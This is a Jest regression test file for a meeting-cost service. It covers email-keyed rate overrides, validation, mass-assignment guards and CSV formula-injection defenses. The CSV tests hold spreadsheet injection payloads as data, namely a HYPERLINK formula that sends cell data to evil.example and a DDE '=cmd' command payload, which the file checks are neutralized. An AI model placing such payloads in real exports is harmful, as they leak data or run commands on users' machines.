/**
 * Regression tests for Issue #1161 — per-member cost rate overrides.
 *
 * `memberRateOverrides` was a Mongoose `Map` keyed by email address. Mongoose
 * maps cannot have keys containing `"."`, and every real email address has one
 * in the domain, so every override an admin ever set was dropped on write —
 * without an error, and with the endpoint answering `200 { success: true }`.
 *
 * Every calculation then fell back to `defaultHourlyRate` for every
 * participant. The numbers were internally consistent, plausible, and wrong,
 * which is why nothing surfaced it.
 *
 * The first test in this file is the whole bug in five lines and is the one to
 * read if you read only one.
 *
 * Confirmed load-bearing: with `main`'s controller and service restored (and
 * the new model + `utils/csvSafety.js` kept, since the suite imports their
 * helpers), 23 of these 45 fail. The model change cannot be isolated further
 * without the suite failing to load; the standalone probe demonstrating the
 * `Map` behaviour is in the issue.
 */

import mongoose from "mongoose";
import { Parser } from "json2csv";

import MeetingCostConfig, {
  readMemberRateOverrides,
  setMemberRateOverrides,
  normalizeOverrideEmail,
} from "../models/meetingCostConfigModel.js";
import Meeting from "../models/meetingModel.js";
import meetingCostService from "../services/meetingCostService.js";
import {
  getConfig,
  updateConfig,
} from "../controllers/meetingCostController.js";
import { neutralizeFormula, neutralizeRow } from "../utils/csvSafety.js";
import { toExportRow } from "../services/auditLogExportService.js";

const ORG_A = new mongoose.Types.ObjectId();
const USER_A = new mongoose.Types.ObjectId();

const mockRes = () => {
  const res = { statusCode: 200, body: undefined };
  res.status = (code) => {
    res.statusCode = code;
    return res;
  };
  res.json = (payload) => {
    res.body = payload;
    return res;
  };
  return res;
};

const asAdmin = (body = {}) => ({
  body,
  params: {},
  query: {},
  user: { _id: USER_A, organization: ORG_A, role: "admin" },
});

beforeAll(async () => {
  if (mongoose.connection.readyState !== 1) {
    await mongoose.connect(process.env.TEST_MONGODB_URI);
  }
});

// ───────────────────────────────────────────────────────────────────────────
describe("storing an override for a real email address", () => {
  it("persists it", async () => {
    const res = mockRes();
    await updateConfig(
      asAdmin({
        memberRateOverrides: { "jane.doe@example.com": 180 },
      }),
      res,
    );

    expect(res.statusCode).toBe(200);

    // Against `main`: `memberRateOverrides` is `{}` here, and the response
    // still says `success: true`.
    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(readMemberRateOverrides(stored).get("jane.doe@example.com")).toBe(
      180,
    );
  });

  it("survives a read back through the API", async () => {
    await updateConfig(
      asAdmin({ memberRateOverrides: { "jane.doe@example.com": 180 } }),
      mockRes(),
    );

    const res = mockRes();
    await getConfig(asAdmin(), res);

    expect(
      readMemberRateOverrides(res.body.data).get("jane.doe@example.com"),
    ).toBe(180);
  });

  it("accepts several addresses, including subdomains and plus-addressing", async () => {
    const res = mockRes();
    await updateConfig(
      asAdmin({
        memberRateOverrides: {
          "jane.doe@example.com": 180,
          "bob+billing@mail.example.co.uk": 45,
          "carol@example.io": 90,
        },
      }),
      res,
    );

    expect(res.statusCode).toBe(200);
    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    const overrides = readMemberRateOverrides(stored);

    expect(overrides.size).toBe(3);
    expect(overrides.get("bob+billing@mail.example.co.uk")).toBe(45);
  });

  it("accepts the array form as well as the object form", async () => {
    const res = mockRes();
    await updateConfig(
      asAdmin({
        memberRateOverrides: [
          { email: "jane.doe@example.com", hourlyRate: 180 },
        ],
      }),
      res,
    );

    expect(res.statusCode).toBe(200);
    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(readMemberRateOverrides(stored).get("jane.doe@example.com")).toBe(
      180,
    );
  });

  it("normalizes case and whitespace on write", async () => {
    await updateConfig(
      asAdmin({ memberRateOverrides: { "  Jane.Doe@Example.COM ": 180 } }),
      mockRes(),
    );

    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(readMemberRateOverrides(stored).get("jane.doe@example.com")).toBe(
      180,
    );
  });

  it("replaces the whole set rather than merging", async () => {
    await updateConfig(
      asAdmin({ memberRateOverrides: { "jane.doe@example.com": 180 } }),
      mockRes(),
    );
    await updateConfig(
      asAdmin({ memberRateOverrides: { "bob@example.com": 45 } }),
      mockRes(),
    );

    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    const overrides = readMemberRateOverrides(stored);
    expect(overrides.size).toBe(1);
    expect(overrides.get("bob@example.com")).toBe(45);
  });

  it("allows clearing the overrides", async () => {
    await updateConfig(
      asAdmin({ memberRateOverrides: { "jane.doe@example.com": 180 } }),
      mockRes(),
    );
    await updateConfig(asAdmin({ memberRateOverrides: {} }), mockRes());

    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(readMemberRateOverrides(stored).size).toBe(0);
  });
});

describe("override validation", () => {
  it.each([
    ["not-an-email", 100],
    ["", 100],
    ["missing-domain@", 100],
    ["@example.com", 100],
  ])("rejects the address %p", async (email, rate) => {
    const res = mockRes();
    await updateConfig(
      asAdmin({ memberRateOverrides: { [email]: rate } }),
      res,
    );

    expect(res.statusCode).toBe(400);
    expect(res.body.message).toMatch(/invalid override email/i);
  });

  it.each([["abc"], [-5], [null], [Infinity]])(
    "rejects the rate %p",
    async (rate) => {
      const res = mockRes();
      await updateConfig(
        asAdmin({ memberRateOverrides: { "jane.doe@example.com": rate } }),
        res,
      );

      expect(res.statusCode).toBe(400);
      expect(res.body.message).toMatch(/invalid hourly rate/i);
    },
  );

  it("rejects a duplicate address that differs only by case", () => {
    const config = new MeetingCostConfig({ organization: ORG_A });

    expect(() =>
      setMemberRateOverrides(config, [
        { email: "jane@example.com", hourlyRate: 100 },
        { email: "JANE@example.com", hourlyRate: 200 },
      ]),
    ).toThrow(/duplicate override/i);
  });

  it("persists nothing when one entry in a batch is invalid", async () => {
    const res = mockRes();
    await updateConfig(
      asAdmin({
        memberRateOverrides: {
          "jane.doe@example.com": 180,
          broken: 90,
        },
      }),
      res,
    );

    expect(res.statusCode).toBe(400);
    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(stored).toBeNull();
  });
});

// ───────────────────────────────────────────────────────────────────────────
describe("cost calculation", () => {
  const seedMeeting = (participants) =>
    Meeting.create({
      uploadedBy: USER_A,
      organization: ORG_A,
      title: "Design review",
      date: new Date(),
      duration: 60, // one hour
      status: "completed",
      participants,
    });

  it("bills a participant at their override rate", async () => {
    await updateConfig(
      asAdmin({
        defaultHourlyRate: 50,
        memberRateOverrides: { "jane.doe@example.com": 180 },
      }),
      mockRes(),
    );

    const meeting = await seedMeeting([
      { name: "Jane", email: "jane.doe@example.com" },
    ]);

    // Against `main`: 50 — the override was never stored, so everyone was
    // billed at the default.
    expect(await meetingCostService.calculateMeetingCost(meeting._id)).toBe(
      180,
    );
  });

  it("mixes overridden and default participants correctly", async () => {
    await updateConfig(
      asAdmin({
        defaultHourlyRate: 50,
        memberRateOverrides: {
          "jane.doe@example.com": 180,
          "contractor@example.com": 45,
        },
      }),
      mockRes(),
    );

    const meeting = await seedMeeting([
      { name: "Jane", email: "jane.doe@example.com" },
      { name: "Contractor", email: "contractor@example.com" },
      { name: "Unlisted", email: "someone@example.com" },
    ]);

    // 180 + 45 + 50 (default)
    expect(await meetingCostService.calculateMeetingCost(meeting._id)).toBe(
      275,
    );
  });

  it("matches a participant email that differs only by case", async () => {
    await updateConfig(
      asAdmin({
        defaultHourlyRate: 50,
        memberRateOverrides: { "jane.doe@example.com": 180 },
      }),
      mockRes(),
    );

    const meeting = await seedMeeting([
      { name: "Jane", email: "Jane.Doe@Example.com" },
    ]);

    // The old lookup was exact-match and case-sensitive, so this would have
    // missed even if the map had worked.
    expect(await meetingCostService.calculateMeetingCost(meeting._id)).toBe(
      180,
    );
  });

  it("applies the prep-time multiplier on top of the override", async () => {
    await updateConfig(
      asAdmin({
        defaultHourlyRate: 50,
        includePreparationTime: true,
        prepTimeMultiplier: 1.5,
        memberRateOverrides: { "jane.doe@example.com": 100 },
      }),
      mockRes(),
    );

    const meeting = await seedMeeting([
      { name: "Jane", email: "jane.doe@example.com" },
    ]);

    expect(await meetingCostService.calculateMeetingCost(meeting._id)).toBe(
      150,
    );
  });

  it("falls back to the default when no config exists", async () => {
    const meeting = await seedMeeting([
      { name: "Jane", email: "jane.doe@example.com" },
    ]);

    expect(await meetingCostService.calculateMeetingCost(meeting._id)).toBe(50);
  });

  it("uses overrides in organization analytics too", async () => {
    await updateConfig(
      asAdmin({
        defaultHourlyRate: 50,
        memberRateOverrides: { "jane.doe@example.com": 180 },
      }),
      mockRes(),
    );

    await seedMeeting([{ name: "Jane", email: "jane.doe@example.com" }]);

    const analytics =
      await meetingCostService.getOrganizationCostAnalytics(ORG_A);
    expect(analytics.totalCost).toBe(180);
  });

  it("rejects an unusable organization id instead of throwing a BSONError", async () => {
    await expect(
      meetingCostService.getOrganizationCostAnalytics(undefined),
    ).rejects.toThrow(/valid organization/i);

    await expect(
      meetingCostService.getMemberTimeAnalytics("not-an-objectid"),
    ).rejects.toThrow(/valid organization/i);
  });
});

// ───────────────────────────────────────────────────────────────────────────
describe("config mass assignment", () => {
  it("does not let a request body re-parent the config", async () => {
    const victimOrg = new mongoose.Types.ObjectId();

    await updateConfig(asAdmin({ defaultHourlyRate: 70 }), mockRes());
    const res = mockRes();
    await updateConfig(
      asAdmin({ organization: victimOrg.toString(), defaultHourlyRate: 5 }),
      res,
    );

    expect(res.statusCode).toBe(200);

    // The caller's own config was updated...
    const own = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(own.defaultHourlyRate).toBe(5);
    // ...and nothing was created against, or moved to, the named organization.
    expect(
      await MeetingCostConfig.findOne({ organization: victimOrg }),
    ).toBeNull();
    expect(await MeetingCostConfig.countDocuments()).toBe(1);
  });

  it("ignores unknown fields rather than storing them", async () => {
    const res = mockRes();
    await updateConfig(
      asAdmin({ defaultHourlyRate: 70, isAdmin: true, __v: 99 }),
      res,
    );

    const stored = await MeetingCostConfig.findOne({ organization: ORG_A });
    expect(stored.defaultHourlyRate).toBe(70);
    expect(stored.toObject().isAdmin).toBeUndefined();
  });

  it("rejects a negative default rate", async () => {
    const res = mockRes();
    await updateConfig(asAdmin({ defaultHourlyRate: -10 }), res);
    expect(res.statusCode).toBe(400);
  });

  it("refuses a session with no organization instead of 500ing", async () => {
    const res = mockRes();
    await updateConfig(
      { body: {}, params: {}, query: {}, user: { _id: USER_A, role: "admin" } },
      res,
    );
    expect(res.statusCode).toBe(403);
  });
});

// ───────────────────────────────────────────────────────────────────────────
describe("CSV formula injection", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a value starting with %j",
    (prefix) => {
      const value = `${prefix}HYPERLINK("https://evil.example","x")`;
      expect(neutralizeFormula(value)).toBe(`\t${value}`);
    },
  );

  it("leaves an ordinary value untouched", () => {
    expect(neutralizeFormula("Jane Doe")).toBe("Jane Doe");
    expect(neutralizeFormula("jane.doe@example.com")).toBe(
      "jane.doe@example.com",
    );
  });

  it("leaves numbers and booleans as they are, so columns stay sortable", () => {
    expect(neutralizeFormula(42)).toBe(42);
    expect(neutralizeFormula(3.5)).toBe(3.5);
    expect(neutralizeFormula(true)).toBe(true);
  });

  it("passes null, undefined and empty strings through", () => {
    expect(neutralizeFormula(null)).toBeNull();
    expect(neutralizeFormula(undefined)).toBeUndefined();
    expect(neutralizeFormula("")).toBe("");
  });

  it("guards every column of a row", () => {
    const row = neutralizeRow({
      name: "=cmd|'/c calc'!A1",
      email: "jane.doe@example.com",
      totalMeetings: 4,
      totalHours: 6.5,
    });

    expect(row.name.startsWith("\t=")).toBe(true);
    expect(row.email).toBe("jane.doe@example.com");
    expect(row.totalMeetings).toBe(4);
  });

  it("keeps the cost report free of live formulas", () => {
    const data = [
      {
        name: '=HYPERLINK("https://evil.example/?d="&A1&B1,"Loading")',
        email: "mallory@example.com",
        totalMeetings: 3,
        totalHours: 4.5,
      },
    ];

    const csv = new Parser({
      fields: ["name", "email", "totalMeetings", "totalHours"],
    }).parse(data.map(neutralizeRow));

    // Against `main` the cell begins `"=HYPERLINK(` and evaluates on open.
    expect(csv).toContain('"\t=HYPERLINK(');
    expect(csv).not.toMatch(/^"=/m);
  });

  it("guards the audit log export the same way", async () => {
    const { default: auditExport } =
      await import("../services/auditLogExportService.js");
    void auditExport;

    const row = toExportRow({
      createdAt: new Date("2026-08-04T10:00:00Z"),
      actor: { name: "=1+1", email: "mallory@example.com" },
      action: "meeting.deleted",
      entity: "Meeting",
      details: { note: "ok" },
    });

    // `toExportRow` itself is unchanged; the guard lives in `csvValue`, so the
    // raw row still carries the hostile value and the *written* cell does not.
    expect(row.actorName).toBe("=1+1");
    expect(neutralizeFormula(row.actorName)).toBe("\t=1+1");
  });
});

// ───────────────────────────────────────────────────────────────────────────
describe("backwards compatibility", () => {
  it("reads a legacy Map-shaped config", () => {
    const legacy = {
      memberRateOverrides: new Map([["jane@example.com", 120]]),
    };
    expect(readMemberRateOverrides(legacy).get("jane@example.com")).toBe(120);
  });

  it("reads a legacy plain-object config", () => {
    const legacy = { memberRateOverrides: { "jane@example.com": 120 } };
    expect(readMemberRateOverrides(legacy).get("jane@example.com")).toBe(120);
  });

  it("returns an empty lookup for a missing or malformed field", () => {
    expect(readMemberRateOverrides(null).size).toBe(0);
    expect(readMemberRateOverrides({}).size).toBe(0);
    expect(readMemberRateOverrides({ memberRateOverrides: 42 }).size).toBe(0);
  });

  it("drops unusable legacy entries rather than throwing on read", () => {
    const legacy = {
      memberRateOverrides: { "jane@example.com": 120, "": 50, bad: "abc" },
    };
    const overrides = readMemberRateOverrides(legacy);

    expect(overrides.size).toBe(1);
    expect(overrides.get("jane@example.com")).toBe(120);
  });

  it("normalizeOverrideEmail tolerates non-strings", () => {
    expect(normalizeOverrideEmail(undefined)).toBe("");
    expect(normalizeOverrideEmail(null)).toBe("");
    expect(normalizeOverrideEmail(42)).toBe("");
  });
});
